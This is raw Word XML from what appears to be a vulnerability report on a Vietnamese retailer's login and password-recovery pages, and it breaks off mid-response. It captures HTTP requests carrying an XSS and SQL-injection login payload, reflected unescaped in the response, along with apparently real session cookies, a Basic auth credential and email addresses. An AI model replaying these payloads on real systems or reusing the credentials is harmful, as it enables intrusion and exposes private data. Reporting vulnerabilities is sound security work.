                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t/>
            </w:r>
            <w:r w:rsidRPr="00CF70A7">
              <w:rPr>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t/>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00CC4809" w:rsidRPr="00013A35" w14:paraId="409FFA3A" w14:textId="77777777" w:rsidTr="00AA4467">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2395" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF" w:themeFill="background1"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="25C48D84" w14:textId="77777777" w:rsidR="00CC4809" w:rsidRPr="00013A35" w:rsidRDefault="00CC4809" w:rsidP="00AA4467">
            <w:pPr>
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00013A35">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:color w:val="000000"/>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t>PARAMETER</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="6932" w:type="dxa"/>
            <w:gridSpan w:val="3"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="0075C1FF" w14:textId="77777777" w:rsidR="00CC4809" w:rsidRPr="00013A35" w:rsidRDefault="00CC4809" w:rsidP="00AA4467">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00957D8C">
              <w:rPr>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t>user_email</w:t>
            </w:r>
            <w:r w:rsidR="000316BB">
              <w:rPr>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t/>
            </w:r>
            <w:r w:rsidRPr="00957D8C">
              <w:rPr>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t/>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00CC4809" w:rsidRPr="00013A35" w14:paraId="2234F082" w14:textId="77777777" w:rsidTr="00AA4467">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2395" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF" w:themeFill="background1"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="544F4B74" w14:textId="77777777" w:rsidR="00CC4809" w:rsidRPr="00013A35" w:rsidRDefault="00CC4809" w:rsidP="00AA4467">
            <w:pPr>
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00013A35">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:color w:val="000000"/>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t>CONDITION</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="6932" w:type="dxa"/>
            <w:gridSpan w:val="3"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="010E71EB" w14:textId="77777777" w:rsidR="00CC4809" w:rsidRPr="00013A35" w:rsidRDefault="00CC4809" w:rsidP="00AA4467">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00957D8C">
              <w:rPr>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t>Anonymous User</w:t>
            </w:r>
            <w:r w:rsidR="000316BB">
              <w:rPr>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t/>
            </w:r>
            <w:r w:rsidRPr="00957D8C">
              <w:rPr>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t/>
            </w:r>
            <w:r w:rsidRPr="00957D8C">
              <w:rPr>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t/>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="63FB5E2D" w14:textId="77777777" w:rsidR="00CC4809" w:rsidRDefault="00CC4809" w:rsidP="00CC4809">
      <w:pPr>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3D58DD78" w14:textId="77777777" w:rsidR="00CC4809" w:rsidRDefault="00CC4809" w:rsidP="00CC4809">
      <w:pPr>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:sectPr w:rsidR="00CC4809" w:rsidSect="00CC4809">
          <w:type w:val="continuous"/>
          <w:pgSz w:w="11909" w:h="16834" w:code="9"/>
          <w:pgMar w:top="1134" w:right="1134" w:bottom="1134" w:left="1418" w:header="680" w:footer="783" w:gutter="0"/>
          <w:cols w:space="720"/>
          <w:docGrid w:linePitch="360"/>
        </w:sectPr>
      </w:pP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327"/>
      </w:tblGrid>
      <w:tr w:rsidR="00CC4809" w:rsidRPr="00013A35" w14:paraId="5942488B" w14:textId="77777777" w:rsidTr="00AA4467">
        <w:trPr>
          <w:trHeight w:val="512"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="9327" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF" w:themeFill="background1"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="15352328" w14:textId="5624B73D" w:rsidR="00CC4809" w:rsidRDefault="00CC4809" w:rsidP="00AA4467">
            <w:pPr>
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00A20BDD">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:lastRenderedPageBreak/>
              <w:t>Request 1</w:t>
            </w:r>
            <w:r w:rsidR="000316BB">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t/>
            </w:r>
            <w:r w:rsidRPr="00A20BDD">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t>:</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="329271DA" w14:textId="393E6FC1" w:rsidR="00CC4809" w:rsidRDefault="00CC4809" w:rsidP="00AA4467">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="0048674E">
              <w:rPr>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t>""POST /dashboard/login.php HTTP/1.1</w:t>
              <w:br/>
              <w:t>Host: staging2.nguyenkimmall.com</w:t>
              <w:br/>
              <w:t>Cookie: sid_customer_82df3=4ea544d166691d870cc59667cd8d1c13-C; mp_skin=desktop; _ga_RWCJ26V2KQ=GS1.1.1621396035.1.1.1621401054.0; _utm_objs=; _pk_id.554926188.f710=376340701.1621399208.1.1621400948.1621399208.; _pk_ses.554926188.f710=*; _ga=GA1.2.122288110.1621399209; _ac_client_id=376340701.1621399209; _asm_visitor_type=r; _ac_an_session=zhzlznzhzjzrzlzizjzizdzgzkzlzgznzjzkzjzizdzizlzhzizgzqzqzhzjzqzdzhzdzizlzhziznzjzjzqznzkzdzizlzhziznzjzjzqznzkzdzhzdzhzqzdzizd2f27zdzgzdzlzmzmzhzkzd; au_id=376340701; _ac_au_gt=1621399209539; gr_reco=17982ec8c2d-a3443b6d74673b0d; _gid=GA1.2.91465732.1621399213; nkudt=%7B%22ct%22%3A%22%5C%2FD0AL5C2DsZrH6znUWV2g4YezsZS%2BQKW8Oay8E6JIj%5C%2FNsDxONrScTkjjEKwMxiiZi24YmIe3Cw1qUopVmR60c2KqD1NyZs4j%2BAVzqE5Aw987gt0U2YSjDpYoU8IBDeVJ%22%2C%22iv%22%3A%22ef98fd3771f4f0d70c847a7e20b5c6ef%22%2C%22s%22%3A%224847753923403249%22%7D; user_track_data=%7B%22identify_id%22%3A%22d41d8cd98f00b204e9800998ecf8427e%22%2C%22identify_name%22%3A%22Kiet+Anhh%22%2C%22identify_phone%22%3A%22%22%2C%22identify_email%22%3A%22ranoxpvp%40gmail.com%22%2C%22identify_address%22%3A%22%22%7D; _asm_uid=376340701; recently_products=85210%2C88446%2C47882%2C94048; recommend_products=71063%2C100495%2C97269%2C100494%2C97267%2C71055%2C78252%2C71148%2C26344%2C71152; nkcarttime=1621400740; current_state=001; _fbp=fb.1.1621400528403.1371688865; cto_bundle=ZX-H2V9MWVY5MXMwb2V1ZXd2VlpnMDd1cnE0MHJmcXhqMkdrVSUyQndiNWZab3B6c0VvR3RWczZTUnNGU1d2UUV3a1A1Sk9uJTJGUlo3b3lZNmclMkZqZ2R0ZXJISVd1aWZaSUxOREZTb0E0Q09PR04yd0xkU0QzbXlGTmlrdWNnTkF4MnZNcFVoejhmRGZlU2lzREs1NzJsa0I0TSUyQjl1UTFyVkx4QlhWSk5wYVlVRUNuc2ljQXV0Tlk3NTU2MTRjRlpFVUZlVE9selpZRTJGYSUyQmlsNWk4WWFoSk1oc25ndyUzRCUzRA; nkcart=2; gr_rt=17982ec8c2d-a3443b6d74673b0d; PHPSESSID=17fo0tj0mp7lj0eg38ptvpo2q5</w:t>
              <w:br/>
              <w:t>User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:88.0) Gecko/20100101 Firefox/88.0</w:t>
              <w:br/>
              <w:t>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</w:t>
              <w:br/>
              <w:t>Accept-Language: en-US,en;q=0.5</w:t>
              <w:br/>
              <w:t>Accept-Encoding: gzip, deflate</w:t>
              <w:br/>
              <w:t>Content-Type: application/x-www-form-urlencoded</w:t>
              <w:br/>
              <w:t>Content-Length: 87</w:t>
              <w:br/>
              <w:t>Origin: https://staging2.nguyenkimmall.com</w:t>
              <w:br/>
              <w:t>Authorization: Basic c3RhZ2luZ25rOlN0QWExSStuZyFOaw==</w:t>
              <w:br/>
              <w:t>Referer: https://staging2.nguyenkimmall.com/dashboard/login.php</w:t>
              <w:br/>
              <w:t>Upgrade-Insecure-Requests: 1</w:t>
              <w:br/>
              <w:t>Te: trailers</w:t>
              <w:br/>
              <w:t>Connection: close</w:t>
              <w:br/>
              <w:t/>
              <w:br/>
              <w:t>name=kietna%40hpt.vn\"&gt;&lt;img+src=x+onerror=alert(1);&gt;&amp;pass[]=aa'+or+1=1--+-&amp;rememberme=on""</w:t>
            </w:r>
            <w:r w:rsidR="000316BB">
              <w:rPr>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t/>
            </w:r>
            <w:r w:rsidRPr="0048674E">
              <w:rPr>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t/>
            </w:r>
          </w:p>
          <w:p w14:paraId="37267424" w14:textId="207E2352" w:rsidR="00CC4809" w:rsidRPr="00013A35" w:rsidRDefault="00CC4809" w:rsidP="00AA4467">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="001B0A1E">
              <w:rPr>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t/>
            </w:r>
            <w:r w:rsidR="000316BB">
              <w:rPr>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t/>
            </w:r>
            <w:r w:rsidRPr="001B0A1E">
              <w:rPr>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t/>
            </w:r>
            <w:r w:rsidR="002B280E">
              <w:rPr>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t/>
            </w:r>
            <w:r w:rsidRPr="001B0A1E">
              <w:rPr>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t/>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00CC4809" w:rsidRPr="00013A35" w14:paraId="5942488B" w14:textId="77777777" w:rsidTr="00AA4467">
        <w:trPr>
          <w:trHeight w:val="512"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="9327" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF" w:themeFill="background1"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="15352328" w14:textId="5624B73D" w:rsidR="00CC4809" w:rsidRDefault="00CC4809" w:rsidP="00AA4467">
            <w:pPr>
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00A20BDD">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:lastRenderedPageBreak/>
              <w:t>Response 1</w:t>
            </w:r>
            <w:r w:rsidR="000316BB">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t/>
            </w:r>
            <w:r w:rsidRPr="00A20BDD">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t>:</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="329271DA" w14:textId="393E6FC1" w:rsidR="00CC4809" w:rsidRDefault="00CC4809" w:rsidP="00AA4467">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="0048674E">
              <w:rPr>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t>""HTTP/1.1 200 OK</w:t>
              <w:br/>
              <w:t>Server: nginx</w:t>
              <w:br/>
              <w:t>Date: Wed, 19 May 2021 05:39:53 GMT</w:t>
              <w:br/>
              <w:t>Content-Type: text/html; charset=UTF-8</w:t>
              <w:br/>
              <w:t>Content-Length: 2952</w:t>
              <w:br/>
              <w:t>Connection: close</w:t>
              <w:br/>
              <w:t>X-Powered-By: PHP/7.0.29</w:t>
              <w:br/>
              <w:t>Expires: Thu, 19 Nov 1981 08:52:00 GMT</w:t>
              <w:br/>
              <w:t>Cache-Control: no-store, no-cache, must-revalidate</w:t>
              <w:br/>
              <w:t>Pragma: no-cache</w:t>
              <w:br/>
              <w:t>Vary: Accept-Encoding,User-Agent</w:t>
              <w:br/>
              <w:t>Access-Control-Allow-Origin: *</w:t>
              <w:br/>
              <w:t>Access-Control-Allow-Origin: *</w:t>
              <w:br/>
              <w:t/>
              <w:br/>
              <w:t/>
              <w:br/>
              <w:t xml:space="preserve">            &lt;input type="email" id="inputUsername" class="form-control" placeholder="Username" required autofocus</w:t>
              <w:br/>
              <w:t xml:space="preserve">                   name="name"</w:t>
              <w:br/>
              <w:t xml:space="preserve">                   value="kietna@hpt.vn"&gt;&lt;img src=x onerror=alert(1);&gt;" /&gt;"</w:t>
            </w:r>
            <w:r w:rsidR="000316BB">
              <w:rPr>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t/>
            </w:r>
            <w:r w:rsidRPr="0048674E">
              <w:rPr>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t/>
            </w:r>
          </w:p>
          <w:p w14:paraId="37267424" w14:textId="207E2352" w:rsidR="00CC4809" w:rsidRPr="00013A35" w:rsidRDefault="00CC4809" w:rsidP="00AA4467">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="001B0A1E">
              <w:rPr>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t/>
            </w:r>
            <w:r w:rsidR="000316BB">
              <w:rPr>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t/>
            </w:r>
            <w:r w:rsidRPr="001B0A1E">
              <w:rPr>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t/>
            </w:r>
            <w:r w:rsidR="002B280E">
              <w:rPr>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t/>
            </w:r>
            <w:r w:rsidRPr="001B0A1E">
              <w:rPr>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t/>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00CC4809" w:rsidRPr="00013A35" w14:paraId="5942488B" w14:textId="77777777" w:rsidTr="00AA4467">
        <w:trPr>
          <w:trHeight w:val="512"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="9327" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF" w:themeFill="background1"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="15352328" w14:textId="5624B73D" w:rsidR="00CC4809" w:rsidRDefault="00CC4809" w:rsidP="00AA4467">
            <w:pPr>
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00A20BDD">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:lastRenderedPageBreak/>
              <w:t>Image-2021-05-19 12:42:37</w:t>
            </w:r>
            <w:r w:rsidR="000316BB">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t/>
            </w:r>
            <w:r w:rsidRPr="00A20BDD">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t>:</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="329271DA" w14:textId="393E6FC1" w:rsidR="00CC4809" w:rsidRDefault="00CC4809" w:rsidP="00AA4467">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="0048674E">
              <w:rPr>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t>"N/A"</w:t>
            </w:r>
            <w:r w:rsidR="000316BB">
              <w:rPr>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t/>
            </w:r>
            <w:r w:rsidRPr="0048674E">
              <w:rPr>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t/>
            </w:r>
          </w:p>
          <w:p w14:paraId="37267424" w14:textId="207E2352" w:rsidR="00CC4809" w:rsidRPr="00013A35" w:rsidRDefault="00CC4809" w:rsidP="00AA4467">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="001B0A1E">
              <w:rPr>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t/>
            </w:r>
            <w:r w:rsidR="000316BB">
              <w:rPr>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t/>
            </w:r>
            <w:r w:rsidRPr="001B0A1E">
              <w:rPr>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t/>
            </w:r>
            <w:r w:rsidR="002B280E">
              <w:rPr>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t/>
            </w:r>
            <w:r w:rsidRPr="001B0A1E">
              <w:rPr>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t/>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00CC4809" w:rsidRPr="00013A35" w14:paraId="5942488B" w14:textId="77777777" w:rsidTr="00AA4467">
        <w:trPr>
          <w:trHeight w:val="512"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="9327" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF" w:themeFill="background1"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="15352328" w14:textId="5624B73D" w:rsidR="00CC4809" w:rsidRDefault="00CC4809" w:rsidP="00AA4467">
            <w:pPr>
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00A20BDD">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:lastRenderedPageBreak/>
              <w:t>Request 1</w:t>
            </w:r>
            <w:r w:rsidR="000316BB">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t/>
            </w:r>
            <w:r w:rsidRPr="00A20BDD">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t>:</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="329271DA" w14:textId="393E6FC1" w:rsidR="00CC4809" w:rsidRDefault="00CC4809" w:rsidP="00AA4467">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="0048674E">
              <w:rPr>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t>""POST /index.php?dispatch=auth.recover_password HTTP/2</w:t>
              <w:br/>
              <w:t>Host: www.nguyenkim.com</w:t>
              <w:br/>
              <w:t>Cookie: _utm_objs=; _pk_id.554926188.973b=376340701.1621399326.2.1621412347.1621410825.; _ac_client_id=376340701.1621399326; _asm_visitor_type=r; _ac_an_session=zhzlznzhzjzqzrzkzjzizdzgzkzlzgznzjzkzjzizdzizlzhziznzizhzhzgzmzdzhzdzizlzhziznzizhzgznzkzdzizlzhziznzizhzgznzkzdzhzdzhzqzdzizd2f27zdzgzdzlzmzmzhzkzd; au_id=376340701; _ac_au_gt=1621399209539; sid_customer_5120c=76cc919a9816115bc171701c3bf91803-C; mp_skin=desktop; SRVID=w7|YKTJ+|YKSXF; _asm_uid=376340701; _ga=GA1.2.169703168.1621399331; _gid=GA1.2.255185360.1621399331; __zi=2000.SSZzejyD5ja-a_QhmHqUcJQLzgUEK0FNE8sq-vnQ7SLwdwBfamGMm3_HfkgQ3nN1FvIXwvb25yuqbg7YDZWm.1; _fbp=fb.1.1621399336880.972473971; gr_reco=17982ee7d6a-3f2e617176a790ff; adpopup_NK_POPUP_DESKTOP_cfcd208495d565ef66e7dff9f98764da=0; adpopup_NK_POPUP_MOBILE_cfcd208495d565ef66e7dff9f98764da=0; cto_bundle=6RiA-l9MWVY5MXMwb2V1ZXd2VlpnMDd1cnE1OFN3YjZORzZDV0VxVkpsSU90SlZqU0tjd1RWWTglMkJFWFExa1ZUcE1qNHJodFB1WndlZzdCM1VvdlVzaEc4SzFsUlFSUGFrJTJCWld3WERiMmtOTEdaaHRJdiUyQlklMkZqSFFnampPQXZYYkFhOXI5NjFIJTJCbTBaS0JmVVJEckxyMDUlMkJWb2glMkJ5RUtoSWlUNkpIZVdVdzI2NmN6eklSbThib3dkbDVwaGQlMkYzZ0dkNFJw; _hjTLDTest=1; _hjid=ea16f0ac-1e83-46ca-9e1e-95b598f8bc6e; fpsend=150130; _pk_ses.554926188.973b=*; _hjAbsoluteSessionInProgress=0; gr_rt=17982ee7d6a-3f2e617176a790ff; login_false=1</w:t>
              <w:br/>
              <w:t>User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:88.0) Gecko/20100101 Firefox/88.0</w:t>
              <w:br/>
              <w:t>Accept: application/json, text/javascript, */*; q=0.01</w:t>
              <w:br/>
              <w:t>Accept-Language: en-US,en;q=0.5</w:t>
              <w:br/>
              <w:t>Accept-Encoding: gzip, deflate</w:t>
              <w:br/>
              <w:t>Content-Type: application/x-www-form-urlencoded; charset=UTF-8</w:t>
              <w:br/>
              <w:t>X-Requested-With: XMLHttpRequest</w:t>
              <w:br/>
              <w:t>Content-Length: 101</w:t>
              <w:br/>
              <w:t>Origin: https://www.nguyenkim.com</w:t>
              <w:br/>
              <w:t>Referer: https://www.nguyenkim.com/login.html</w:t>
              <w:br/>
              <w:t>Te: trailers</w:t>
              <w:br/>
              <w:t>Connection: close</w:t>
              <w:br/>
              <w:t/>
              <w:br/>
              <w:t>user_email=kietna%40hpt.vn&amp;security_hash=8162e8d9bcafbd972569c504076a6107&amp;result_ids=save-p&amp;is_ajax=1""</w:t>
            </w:r>
            <w:r w:rsidR="000316BB">
              <w:rPr>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t/>
            </w:r>
            <w:r w:rsidRPr="0048674E">
              <w:rPr>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t/>
            </w:r>
          </w:p>
          <w:p w14:paraId="37267424" w14:textId="207E2352" w:rsidR="00CC4809" w:rsidRPr="00013A35" w:rsidRDefault="00CC4809" w:rsidP="00AA4467">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="001B0A1E">
              <w:rPr>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t/>
            </w:r>
            <w:r w:rsidR="000316BB">
              <w:rPr>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t/>
            </w:r>
            <w:r w:rsidRPr="001B0A1E">
              <w:rPr>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t/>
            </w:r>
            <w:r w:rsidR="002B280E">
              <w:rPr>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t/>
            </w:r>
            <w:r w:rsidRPr="001B0A1E">
              <w:rPr>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t/>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00CC4809" w:rsidRPr="00013A35" w14:paraId="5942488B" w14:textId="77777777" w:rsidTr="00AA4467">
        <w:trPr>
          <w:trHeight w:val="512"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="9327" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF" w:themeFill="background1"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="15352328" w14:textId="5624B73D" w:rsidR="00CC4809" w:rsidRDefault="00CC4809" w:rsidP="00AA4467">
            <w:pPr>
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00A20BDD">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:lastRenderedPageBreak/>
              <w:t>Response 1</w:t>
            </w:r>
            <w:r w:rsidR="000316BB">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t/>
            </w:r>
            <w:r w:rsidRPr="00A20BDD">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t>:</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="329271DA" w14:textId="393E6FC1" w:rsidR="00CC4809" w:rsidRDefault="00CC4809" w:rsidP="00AA4467">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="0048674E">
              <w:rPr>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t>""HTTP/2 200 OK</w:t>
              <w:br/>
              <w:t>Date: Wed, 19 May 2021 08:20:29 GMT</w:t>
              <w:br/>
